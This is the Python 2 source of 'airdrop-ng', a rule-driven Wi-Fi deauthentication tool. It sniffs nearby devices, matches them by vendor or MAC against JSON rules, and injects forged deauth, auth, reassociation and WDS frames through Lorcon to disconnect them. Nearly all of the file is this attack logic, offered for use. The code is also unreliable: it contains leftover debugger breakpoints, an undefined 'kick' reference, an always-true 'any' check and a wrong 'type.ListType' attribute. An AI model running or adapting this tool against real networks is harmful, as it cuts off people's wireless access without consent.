#!/usr/bin/env python
#part of project lemonwedge
__author__  = "TheX1le AKA Textile & Crypt0s"
__version__ = "BETA2"
__licence__ = "GPL2"
from optparse import OptionParser
from re import match, IGNORECASE
from re import compile as recompile
from random import randrange
from os import path, geteuid
from time import sleep, localtime
from airdrop import bcolors, install_dir
from binascii import a2b_hex
from sys import argv, stderr
from sys import exit as sexit
import types
import json

# Todo: only compare values of rule to values of tool wifiobjects that exist

#for debug
import pdb

try:
    import PyLorcon2
except ImportError, e:
    print "Did you read the readme?\nYou seem to be missing PyLorcon2"
    print e

try:
    import Tool80211
    import Gen80211
    import liboui2
except ImportError, e:
    print "Did you read the readme?\nYou seem to be missing the py80211 libs"
    print e

# debug
import pdb


class messages:
    """
    handle all printing 
    allows for central logging
    """
    def __init__(self, log, dir="/var/log/"):
        """
        int vars for printing class
        """
        date = localtime()
        self.date = "%s%s%s" %(date[0], date[1], date[2])
        self.time = "%s-%s-%s" %(date[3], date[4], date[5])
        self.logging = log #log error messages to a file
        #logfile
        name = "/airdrop-ng_%s-%s.log" %(self.date, self.time)
        self.logfile = dir + name
        # enable colors
        self.color = True
        # hold info before we write to file
        self.logBuff = []
        
        if self.logging is True:
            try:
                file = open(self.logfile, 'a')
                file.write(self.date + "-" + self.time + "\n")
                file.write("Airdrop-ng Logfile\n")
                file.close
            except IOError,e:
                self.logging = False
                self.printError(["Could not open file " + self.logfile +"\n\n",
                    str(e) + "\n"])

    def printMessage(self,message):
        """
        print standard info messages
        """
        TYPE = type(message).__name__
        if TYPE == 'list':
            for line in message:
                print line
        elif TYPE == 'str':
            print message
        self.log(message, TYPE)
        
    def printError(self, error):
        """
        write errors to stderr in red
        """
        TYPE = type(error).__name__
        if TYPE == 'list':
            for line in error:
                stderr.write(bcolors.FAIL + line + "\n"+bcolors.ENDC)
        elif TYPE == 'str':
            stderr.write(bcolors.FAIL + error + "\n" + bcolors.ENDC)
        self.log(error, TYPE)

    def log(self, data, TYPE):
        """
        write all messages to a file
        """
        if self.logging is False:
            return
        try:
            file = open(self.logfile, 'a')
        except IOError, e:
            self.logging = False
            self.printError(["Could not open file " + self.logfile + "\n",
                str(e) + "\n"])
            sexit(-1)
        if TYPE == 'list':
            for item in data:
                # str allows printing of data structures
                file.write(str(item) + "\n")
        elif TYPE == 'str':
            file.write(data)
        file.close()

class Rule:
    # The client or AP rule is the input to this class
    def __init__(self, rule):
        pdb.set_trace()
        self.rule = rule
        anymatch = recompile('any', IGNORECASE)
        for key in rule.keys():
            try:
                # Note there could be a bug here if it doesn't get named the same in client obj.
                if key == "company":
                    #Build a greedy, case-ignoring regex to match off of
                    self.companymatch = recompile(rule[key]+".*", IGNORECASE)
                if anymatch.match(rule[key]):
                    self.any = True
                if key == "kickmethod":
                    self.kickmethod = rule[key]
                    del rule[key]
            except:
                print "We handled an error related to lists in the rule -- it's OK.  We know about it."

    def match(self, obj):
        # There will need to be error handling here for if you try to compare a client to an AP rule or vice versa
        obj_attributes = obj.__dict__
        for key in obj_attributes.keys():
            try:
                # If it says any in the rule, realize that and drop it
                if any:
                    result = True
                # Company Name Match
                if key == "company":
                    # If it's a list of companies
                    if isinstance(self.rule[key],type.ListType):
                        for item in rule['company']:
                            # Do any items in the list match our object?
                            if self.companymatch.match(item):
                                result = True
                                break
                    elif self.companymatch.match(obj_attributes[key]):
                        result = True

                # Detect Lists
                elif isinstance(self.rule[key],type.ListType):
                    result = obj_attributes[key] in self.rule[key]
                elif obj_attributes[key] == self.rule[key]:
                    result = True
                else:
                    result = False
                # Print the match to the user if there was a match on the rule
                if result:
                    print "Matched on: " + str(obj_attributes[key])
                return result
            except KeyError:
                print "Rule Error -- That attribute doesn't exist in the client or AP object"


class getTargets:
    """
    Get Targets from Airview and parse rule files
    """
    def __init__(self, toolinstance, rulefile, debug):
        """
        Init with all vars for getTargets class
        """
        self.rulefile = rulefile
        self.Airv = toolinstance
        # start up the sniffer and airview 
        self.debug       = debug  # debug flag
        self.targets     = []   # var to store matched targets in

    def dataParse(self):
        """
        parse the user provided rules and 
        place its output into the rule matcher
        """
        # Parse the rules
        ap_rules = []
        client_rules = []
        apmatch = recompile('ap', IGNORECASE)
        clientmatch = recompile('client', IGNORECASE)
        with open(self.rulefile, 'r') as json_data:
            try:
                data = json.load(json_data)
            except Exception, e:
                print e
                print "The JSON configuration file failed to parse.  See the examples"
                sexit(-1)
            # Determine if this is an ap or client rule, then place in the right list
            for key in data.keys():
                try:
                    rtype = data[key]['type'] # The Type refers to the rule being for clients or access points
                    attack = data[key]['attack'] # Attack refers to what kind of wireless deauth we will perform                
                except KeyError, e:
                    print "Looks like you forgot to add %s to your rules."  %(e)
                    sexit(-1)
                del data[key]['type']
                del data[key]['attack']
                pdb.set_trace()
                if apmatch.match(rtype):
                    ap_rules.append(Rule(data[key]))
                elif clientmatch.match(rtype):
                    client_rules.append(Rule(data[key]))
                else:
                    print "Looks like you forgot to add type to your rules. I don't know if this is an AP or Client rule."
                    sexit(-1)
        #self.rules = [ap_rules, client_rules]
        
        # extra copy here can probably remove
        pdb.set_trace()
        clientObjs = self.Airv.clientObjects
        apObjs = self.Airv.apObjects

        # match clients in air to kick rules
        self.targets = []
        for client in clientObjs:
            for clientRule in client_rules:
                if clientRule.match(client):
                    client.kickmethod = clientRule.kickmethod
                    self.targets.append(client)
        for ap in apObjs:
            for apRule in ap_rules:
                if apRule.match(ap):
                    ap.kickmethod = apRule.kickmethod
                    self.targets.append(ap)
         # return the list of targets to kick
        return self.targets

    def run(self):
        """
        reparse all data every 4 seconds
        """
        self.targets = self.dataParse()


class Kicker:
    """
    class for building and sending the kick packets
    """
    def __init__(self, ctx):
        self.lorconCtx = ctx
        self.engine = Gen80211.packetGenerator()
                
    # We're going to need to adjust targets to be matched to attack
    def makeMagic(self, targets, pnap = 0):
        """
        function where the targes are looped though 
        and packets are sent to them
        """
        # Targets are the ap and client objects tagged up by the matches
        # speed improvments to be found here if we thread packet generator
        packetQue = []
        # hard coded number of how many copys of each packet is sent
        packetCount = 1 
        # as reminder 0 = all, 1 = deauth, 2 auth, 3 reauth, 4 wds
        for obj in targets:
            """Get the object type.  Will return "ap" or "client" depending on 
            the spelling of the name of the class in the tool lib"""
            obj.type = obj.__class__.__name__
            
            # OK we need to drop a client, here's the path for that.
            if obj.type == "client":
                ap = obj.bssid
                kickmethod = obj.kickmethod
                
                # set the vars that act as the parameters to the deauthengine
                # This is kinda a hack job.
                channel = ap.channel
                client_mac = obj.mac
                bssid = ap.bssid

                # If it's not a list, make it one
                if isinstance(kickmethod,types.IntType):
                    kickmethod = [kickmethod]
                # Well, looks like we got us a cowboy
                if kickmethod == 0:
                    kickmethod = [1,2,3,4]
                # Kick according to attacks in list
                if 1 in kickmethod:
                    packetQue.extend(
                        self.engine.deauthPacketEngine(
                            True, client_mac, bssid, bssid, channel))
                if 2 in kickmethod:
                    packetQue.extend(
                        self.engine.authPacketEngine(
                            True, client_mac, bssid, bssid, channel))
                if 3 in kickmethod:
                    packetQue.extend(
                        self.engine.reassPacketEngine(
                            True, client_mac, bssid, bssid, channel))
                if 4 in kickmethod:
                    packetQue.extend(
                        self.engine.wdsPacketEngine(
                            True, bssid, client_mac, bssid, channel))
                #pew pew pew! Fire deauth packets!
                if kickmethod == 0:
                    while kickmethod != 4:
                        kickmethod = kickmethod + 1
                        kick[kickmethod] 
                else:
                    kick[kickmethod]
                    
            elif obj.type == "accessPoint": # I Disagree with this camelcase
                pass # currently unimplemented.  Will hold autoimmune attacks

        numPackets = len(packetQue)
        message.printMessage(
            "\nAttempting to TX %i packets %i times each" %(numPackets, packetCount))
        while len(packetQue) != 0:
            self.lorconTX(
                packetCount, #number of packets to send
                packetQue[0][0], #packet in hex
                int(packetQue[0][1]) #channel to tx the packet on
                )
            sleep(pnap)
            del packetQue[0] #remove the sent packet from the que
        message.printMessage(
            "\nSent %i packets %i times each" %(numPackets, packetCount))
        # update total packet count
        return numPackets * packetCount
                
    def lorconTX(self, pktNum=5, packet=None, channel=1 ,pnap=0):
        """
        Uses lorcon2 to send the actual packets
        """
        #why the hell does pktNum default = 5?
        #pktNum is number each packet is sent
        count = 0
        try:
            cchannel = self.lorconCtx.get_channel()
        except PyLorcon2.Lorcon2Exception ,e:
            message.printError(["\n Error Message from lorcon:",str(e),
                "Unable to get channel the wireless card is on"])
        try:
            self.lorconCtx.set_channel(channel) #set the channel to send packets on
        except PyLorcon2.Lorcon2Exception ,e:
            message.printError(["\nError Message from lorcon:",str(e),
                "Unable to set channel card does not seem to support it",
                "Skipping packet"])
            return False
        while count != pktNum:
            try:
                self.lorconCtx.send_bytes(packet)
            except PyLorcon2.Lorcon2Exception ,e:
                message.printMessage(['\nError Message from lorcon:',str(e),
                "Are you sure you are using the correct driver with the -d option?",
                "Or try ifconfig up on the card you provided and its vap."])
                sexit(-1)
            count += 1
        else:
                if pnap > 0:
                        sleep(pnap)
        return

class AdMain:
    """
    Airdop-ng2 main class
    """
    def __init__(self):
        """
        Set up the program
        """
        # trigger program to exit
        # self.exit = False
        # total packets tx'd
        self.TotalPacket = 0
        # check if were root, exit if were not
        self.uidCheck() 
            
    def mloop(self, args):
        """
        main program loop
        args = options var from optparse
        """
        try:
            # Start the main loop
            if None in [args.card, args.rule]:
                message.printError(["-i or -r is missing\nExiting...\n\n"])
                self.exit(-1)
            napTime = float(args.nap)
            airview = Tool80211.Airview(args.card)
            # start the sniffer
            airview.start()
            #send the sniffer and the rules and get matches
            Targeting = getTargets(airview,args.rule,args.debug)
            #set zero packet flag to false
            zp = False
            # set up kicker
            daKicker = Kicker(airview.ctx)
            while True:
                    Targeting.run()
                    if Targeting.targets != None:
                        rtnPktCount = daKicker.makeMagic(Targeting.targets, int(args.pnap))
                        if rtnPktCount == 0:
                            message.printMessage(
                                "Zero Packets were to be sent, Napping for 5 sec to await changes in sniffed data\n")
                            zp = True
                        self.TotalPacket += rtnPktCount
                        if zp is True:
                            time = 5
                            zp = False
                        else:
                            time = napTime
                        message.printMessage(
                            "Waiting %s sec in between loops\n" %(time))
                        sleep(time)

        except (KeyboardInterrupt, SystemExit):
            message.printMessage(["\nAirdrop-ng will now exit", \
                "Sent %i Packets" %(self.TotalPacket), \
                "\nExiting Program, Please take your card " \
                "%s out of monitor mode" %(args.card)])
            sexit(0)
        
    def box(self):
        """
        Prints the header to use airgraph-ng
        in a box with pretty blue terminal colors
        """
        print "\n" + bcolors.OKBLUE + "#"*49
        print ''.join(["#",
            " "*13,
            bcolors.ENDC,
            "Welcome to AirDrop-ng",
            bcolors.OKBLUE,
            " "*13,
            "#"])
        print "#"*49 + bcolors.ENDC + "\n"
    
    def uidCheck(self):
        """
        check to see if were root
        """
        # geteuid from os
        if geteuid() != 0:
            message.printError(["airdrop-ng must be run as root.\n",
            "Please 'su' or 'sudo -i' and run again.\n","Exiting...\n\n"])
            self.exit(-1)
    
    def exit(self, num):
        """
        exit the program
        num = int to exit with
        """
        sexit(-1)

if __name__ == "__main__":
    """
    Main function.
    Parses command line input for proper switches and arguments. Error checking is done in here.
    Variables are defined and all calls are made from MAIN.
    """
    
    parser = OptionParser("usage: %prog options [-i,-r] -s -p -b -n")  
    parser.add_option("-i", "--interface", dest="card", nargs=1,
         help="Wireless card in monitor mode to inject from")
    parser.add_option("-r", "--rule", dest="rule",
        nargs=1, help="Rule File for matched deauths")
    parser.add_option("-s", "--sleep", dest="pnap", default=0,
        nargs=1, type="int", help="Time to sleep between sending each packet")
    parser.add_option("-b", "--debug", dest="debug", action="store_true",
        default=False, help="Turn on Rule Debugging")
    parser.add_option("-l", "--logging", dest="log",
        action="store_true", default=False,
        help="Enable Logging to a file, if none provided default is used")
    parser.add_option("-n", "--nap", dest="nap", default=0, 
        nargs=1, help="Time to sleep between loops")

    dropkick = AdMain()
    if len(argv) <= 3: #check and show help if no arugments are provided at runtime
                dropkick.box()
                parser.print_help()
                print "\nERROR Not enough CLI arguments"
                print "\nSample command line arguments:"
                print "\nairdrop-ng -i wlan0 -r rulefile.txt\n"
                sexit(0)
    (options, args) = parser.parse_args()
    #start up printing
    if args == []:
        message = messages(options.log)
    else:
        message = messages(options.log, args[0])
    
    # start the main loop
    #dropkick.box()
    dropkick.mloop(options)
